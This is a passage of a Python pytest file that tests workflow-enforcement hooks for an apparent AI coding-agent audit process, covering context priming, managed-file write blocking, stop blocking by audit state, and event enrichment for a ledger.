        assert "PROTOCOL VIOLATION" in output.get("additionalContext", "")


class TestPrimerWithMockBinary:
    """BH-010: Tests that exercise actual primer logic with a mock binary."""

    def _setup(self, tmp_path, status_lines):
        (tmp_path / "docs" / "holtz" / ".sahjhan").mkdir(parents=True)
        (tmp_path / "enforcement").mkdir(parents=True)
        # Write enforcement cache with fresh timestamp for freshness gate
        import sys
        sys.path.insert(0, os.path.join(REPO_ROOT, "enforcement", "hooks"))
        from datetime import datetime, timezone

        from _protocol_cache import empty_cache, write_cache
        _cache = empty_cache()
        _cache["state"] = "fix_loop"
        _cache["last_sahjhan_cmd"] = datetime.now(timezone.utc).isoformat()  # noqa: UP017
        write_cache(str(tmp_path), _cache)
        # Write status to a file so the mock binary can cat it
        status_file = tmp_path / "mock_status.txt"
        status_file.write_text("\n".join(status_lines) + "\n")
        _create_mock_binary(tmp_path, (
            'case "$*" in\n'
            '  *status*)\n'
            '    cat ' + str(status_file) + '\n'
            '    exit 0\n'
            '    ;;\n'
            'esac\n'
            'exit 0'
        ))

    def test_injects_context_for_active_run(self, tmp_path):
        """Primer injects resume context when an active run exists."""
        status = [
            "state: fix_loop (50 events, chain valid)",
            "sets:",
            "  perspective: 3/13 [✓ component, · integration, ...]",
            "next:",
            "  fix_commit: ready",
            "  pattern_check: ready",
        ]
        self._setup(tmp_path, status)
        # Write active-run marker so run_number is derived from ledger
        (tmp_path / "docs" / "holtz" / ".sahjhan" / "active-run").write_text("run-31\n")
        event = {"user_message": "continue", "cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook(
            "primer.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        assert code == 0
        assert output.get("continue") is True
        # exit_warn puts resume context in additionalContext
        context = output.get("additionalContext", "")
        assert "fix_loop" in context
        assert "Run 31" in context

    def test_silent_for_terminal_state(self, tmp_path):
        """Primer does nothing when run is in terminal state."""
        self._setup(tmp_path, ["state: finalized (100 events, chain valid)"])
        event = {"user_message": "hello", "cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook(
            "primer.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        assert code == 0
        # Terminal state = exit_ok, no additionalContext
        assert output.get("continue") is True
        assert "additionalContext" not in output

    def test_injects_lens_priming_in_audit(self, tmp_path):
        """Primer injects lens priming when in audit state with active perspective."""
        status = [
            "state: audit (30 events, chain valid)",
            "sets:",
            "  perspective: 0/13 [· component, ...]",
            "next:",
            "  audit_complete: ready",
        ]
        self._setup(tmp_path, status)
        event = {"user_message": "continue", "cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook(
            "primer.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        context = output.get("additionalContext", "")
        assert "audit" in context

    def test_warns_when_context_reset_fails(self, tmp_path):
        """Issue #35 bug 4: Primer must warn (not silently suppress) when context_reset fails.

        When the daemon is unreachable, the primer should still inject resume
        context but include a warning about the failed context_reset recording.
        """
        status = [
            "state: awaiting_clear (20 events, chain valid)",
            "sets:",
            "  perspective: 1/13 [✓ component, · integration, ...]",
            "next:",
            "  resume: blocked",
        ]
        self._setup(tmp_path, status)
        # Write active-run marker
        (tmp_path / "docs" / "holtz" / ".sahjhan" / "active-run").write_text("run-35\n")
        # No daemon running → record_authed_event will fail
        event = {"user_message": "continue", "cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook(
            "primer.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        context = output.get("additionalContext", "")
        # Must still inject resume context
        assert "awaiting_clear" in context
        # Must warn about failed context_reset — check for explicit warning text,
        # not just substring (pytest temp dirs include test name which contains "context_reset")
        assert "context_reset failed" in context.lower() or "context_reset recording failed" in context.lower(), (
            "Primer must warn when context_reset recording fails, not silently suppress. "
            f"Got context: {context}"
        )


class TestActiveLedger:
    """Tests for active ledger detection in hooks."""

    def test_active_ledger_returns_name(self, tmp_path):
        """_active_ledger returns the ledger name from marker file."""
        sahjhan_dir = tmp_path / "docs" / "holtz" / ".sahjhan"
        sahjhan_dir.mkdir(parents=True)
        (sahjhan_dir / "active-run").write_text("run-22\n")
        # Import the function
        import importlib.util
        spec = importlib.util.spec_from_file_location(
            "_common_enforcement",
            os.path.join(REPO_ROOT, "enforcement", "hooks", "_common.py"),
        )
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        result = mod._active_ledger(str(tmp_path))
        assert result == "run-22"

    def test_active_ledger_returns_none_missing(self, tmp_path):
        """_active_ledger returns None when no marker file exists."""
        import importlib.util
        spec = importlib.util.spec_from_file_location(
            "_common_enforcement",
            os.path.join(REPO_ROOT, "enforcement", "hooks", "_common.py"),
        )
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        result = mod._active_ledger(str(tmp_path))
        assert result is None

    def test_active_run_marker_matches_ledger_registry(self):
        """active-run marker value must match a registered ledger name.

        BH-005: If the marker says 'run' but the ledger is named 'run-26',
        hooks pass --ledger run which fails to resolve. The marker must
        contain the full ledger name (e.g. 'run-26'), not the template name.
        """
        marker = os.path.join(REPO_ROOT, "docs", "holtz", ".sahjhan", "active-run")
        if not os.path.exists(marker):
            pytest.skip("No active-run marker (no active audit)")
        with open(marker, encoding="utf-8") as f:
            ledger_name = f.read().strip()
        registry = os.path.join(REPO_ROOT, "docs", "holtz", ".sahjhan", "ledgers.toml")
        if not os.path.exists(registry):
            pytest.skip("No ledger registry")
        with open(registry, encoding="utf-8") as f:
            registry_text = f.read()
        assert f'name = "{ledger_name}"' in registry_text, (
            f"active-run marker says '{ledger_name}' but no ledger with that "
            f"name found in ledgers.toml. Hooks will fail to resolve --ledger {ledger_name}. "
            f"Use the full ledger name (e.g. 'run-26'), not the template name ('run')."
        )


# --- pre_tool_hook.py (PreToolUse) ---


class TestPreToolHook:
    """Tests for the pre_tool_hook.py thin wrapper."""

    def test_blocks_managed_path(self):
        """pre_tool_hook blocks writes to sahjhan-managed files."""
        event = {
            "tool_input": {"file_path": "docs/holtz/STATUS.md"},
            "tool_name": "Edit",
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("pre_tool_hook.py", event)
        assert_blocked(code, output, "managed")

    def test_allows_non_managed_path(self):
        """pre_tool_hook allows writes outside managed paths."""
        event = {
            "tool_input": {"file_path": "src/main.py"},
            "tool_name": "Edit",
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("pre_tool_hook.py", event)
        assert_allowed(code, output)

    def test_allows_empty_path(self):
        """pre_tool_hook allows when no file path is provided."""
        event = {"tool_input": {}, "tool_name": "Edit", "cwd": REPO_ROOT}
        code, output, _ = run_enforcement_hook("pre_tool_hook.py", event)
        assert_allowed(code, output)

    def test_degrades_gracefully_without_binary(self, tmp_path):
        """pre_tool_hook allows when sahjhan binary is unavailable."""
        event = {
            "tool_input": {"file_path": "src/main.py"},
            "tool_name": "Edit",
            "cwd": str(tmp_path),
        }
        code, output, _ = run_enforcement_hook(
            "pre_tool_hook.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        assert_allowed(code, output)


# --- stop_hook.py (Stop) ---


class TestStopHook:
    """Tests for the stop_hook.py thin wrapper."""

    def test_allows_without_binary(self, tmp_path):
        """stop_hook degrades gracefully when no binary available."""
        event = {"cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook(
            "stop_hook.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        assert code == 0
        assert output == {}

    def test_allows_without_active_run(self, tmp_path):
        """stop_hook allows when no .sahjhan directory exists."""
        _create_mock_binary(tmp_path, 'echo "state: finalized (1 events, chain valid)"')
        (tmp_path / "enforcement").mkdir(parents=True)
        event = {"cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook(
            "stop_hook.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        assert code == 0
        assert output == {}

    def test_degrades_gracefully_on_oserror(self, tmp_path):
        """stop_hook allows when binary is unexecutable."""
        (tmp_path / "docs" / "holtz" / ".sahjhan").mkdir(parents=True)
        _create_mock_binary(tmp_path, "exit 0")
        binary_path = list((tmp_path / "bin").iterdir())[0]
        binary_path.chmod(0o000)
        event = {"cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook(
            "stop_hook.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        binary_path.chmod(0o755)
        assert code == 0

    @staticmethod
    def _setup_active_audit(tmp_path, state_name):
        """Create mock binary + active audit that reports given state."""
        (tmp_path / "docs" / "holtz" / ".sahjhan").mkdir(parents=True)
        (tmp_path / "enforcement").mkdir(parents=True)
        (tmp_path / "enforcement" / "protocol.toml").write_text("")
        _create_mock_binary(
            tmp_path,
            f'echo "state: {state_name} (1 events, chain valid)"',
        )
        # Write enforcement cache with fresh timestamp for freshness gate
        import sys
        sys.path.insert(0, os.path.join(REPO_ROOT, "enforcement", "hooks"))
        from datetime import datetime, timezone

        from _protocol_cache import empty_cache, write_cache
        cache = empty_cache()
        cache["state"] = state_name
        cache["last_sahjhan_cmd"] = datetime.now(timezone.utc).isoformat()  # noqa: UP017
        write_cache(str(tmp_path), cache)

    @pytest.mark.parametrize("state", [
        "recon", "merge_ready", "merge_done",
        "perspective_clean", "all_perspectives_clean",
        "final_sweep_clean", "converged",
    ])
    def test_blocks_in_non_terminal_non_active_states(self, tmp_path, state):
        """Issue #22: stop hook must block ALL non-terminal states, not just _ACTIVE_WORK_STATES."""
        self._setup_active_audit(tmp_path, state)
        event = {"cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook(
            "stop_hook.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        assert code == 0
        decision = output.get("decision")
        assert decision == "block", (
            f"State '{state}' should be blocked but got decision={decision!r}. "
            f"Full output: {output}"
        )

    def test_allows_in_awaiting_clear_state(self, tmp_path):
        """Issue #32: awaiting_clear is designed for agent stop — must be allowed."""
        self._setup_active_audit(tmp_path, "awaiting_clear")
        event = {"cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook(
            "stop_hook.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        assert code == 0
        assert output.get("decision") != "block", (
            f"awaiting_clear should allow stop but got: {output}"
        )

    @pytest.mark.parametrize("state", [
        "audit", "fix_loop", "pattern_analysis", "final_sweep",
    ])
    def test_blocks_in_active_work_states(self, tmp_path, state):
        """Active work states must also be blocked (pre-existing behavior)."""
        self._setup_active_audit(tmp_path, state)
        event = {"cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook(
            "stop_hook.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        assert code == 0
        assert output.get("decision") == "block", (
            f"Active state '{state}' should be blocked but got: {output}"
        )

    def test_allows_in_idle_state(self, tmp_path):
        """Idle state should allow stop (no audit in progress)."""
        self._setup_active_audit(tmp_path, "idle")
        event = {"cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook(
            "stop_hook.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        assert code == 0
        assert output.get("decision") != "block", (
            f"Idle state should allow stop but got: {output}"
        )

    def test_allows_in_finalized_state(self, tmp_path):
        """Terminal (finalized) state should allow stop."""
        self._setup_active_audit(tmp_path, "finalized")
        event = {"cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook(
            "stop_hook.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        assert code == 0
        assert output.get("decision") != "block", (
            f"Finalized state should allow stop but got: {output}"
        )


class TestStopHookTerminatedAudit:
    """Stop hook allows stop when audit is terminated."""

    def test_allows_stop_on_terminated_marker(self, tmp_path):
        """Terminated marker present → allow stop."""
        sahjhan_dir = tmp_path / "docs" / "holtz" / ".sahjhan"
        sahjhan_dir.mkdir(parents=True)
        (sahjhan_dir / "terminated").write_text("reason: daemon_pid_dead\n")

        event = {"cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook("stop_hook.py", event, cwd=str(tmp_path))
        assert code == 0
        assert output.get("decision") != "block", (
            f"Terminated audit should allow stop but got: {output}"
        )


# --- post_tool_hook.py (PostToolUse) ---


class TestPostToolHook:
    """Tests for the post_tool_hook.py thin wrapper."""

    def test_allows_without_binary(self, tmp_path):
        """post_tool_hook degrades gracefully when no binary available."""
        event = {
            "tool_name": "Edit",
            "tool_input": {"file_path": "src/main.py"},
            "cwd": str(tmp_path),
        }
        code, output, _ = run_enforcement_hook(
            "post_tool_hook.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        assert code == 0
        assert output.get("continue") is True

    @pytest.fixture
    def ptmod(self):
        """Load post_tool_hook module for unit testing."""
        import importlib.util
        spec = importlib.util.spec_from_file_location(
            "post_tool_hook",
            os.path.join(ENFORCEMENT_HOOKS_DIR, "post_tool_hook.py"),
        )
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        return mod

    def test_enriches_read_line_span(self, ptmod):
        """post_tool_hook enriches file_read with offset/limit as line span."""
        record = {"event_type": "file_read", "fields": {"file_path": "src/main.py"}}
        tool_input = {"file_path": "src/main.py", "offset": "10", "limit": "50"}
        result = ptmod._enrich_auto_record(record, "Read", tool_input)
        assert result["fields"]["line_start"] == "10"
        assert result["fields"]["line_end"] == "59"
        assert result["fields"]["tool"] == "Read"

    def test_enriches_edit_lines_changed(self, ptmod):
        """post_tool_hook enriches source_edit with lines_changed from old_string."""
        record = {"event_type": "source_edit", "fields": {"file_path": "src/main.py"}}
        tool_input = {
            "file_path": "src/main.py",
            "old_string": "line1\nline2\nline3",
            "new_string": "new1\nnew2",
        }
        result = ptmod._enrich_auto_record(record, "Edit", tool_input)
        assert result["fields"]["lines_changed"] == "3"
        assert result["fields"]["edit_type"] == "partial"
        assert result["fields"]["tool"] == "Edit"

    def test_enriches_write_full_file(self, ptmod):
        """post_tool_hook marks Write as full_file edit."""
        record = {"event_type": "source_edit", "fields": {"file_path": "src/main.py"}}
        tool_input = {"file_path": "src/main.py", "content": "full file content"}
        result = ptmod._enrich_auto_record(record, "Write", tool_input)
        assert result["fields"]["edit_type"] == "full_file"
        assert result["fields"]["tool"] == "Write"

    def test_enriches_grep_search(self, ptmod):
        """post_tool_hook enriches file_search with pattern and path."""
        record = {"event_type": "file_search", "fields": {"file_path": ""}}
        tool_input = {"pattern": "TODO", "path": "src/"}
        result = ptmod._enrich_auto_record(record, "Grep", tool_input)
        assert result["fields"]["pattern"] == "TODO"
        assert result["fields"]["search_path"] == "src/"
        assert result["fields"]["tool"] == "Grep"

    def test_builds_bash_command_event(self, ptmod):
        """post_tool_hook builds bash_command event from tool_input."""
        result = ptmod._build_bash_event({"command": "git status"})
        assert result["event_type"] == "bash_command"
        assert result["fields"]["command"] == "git status"
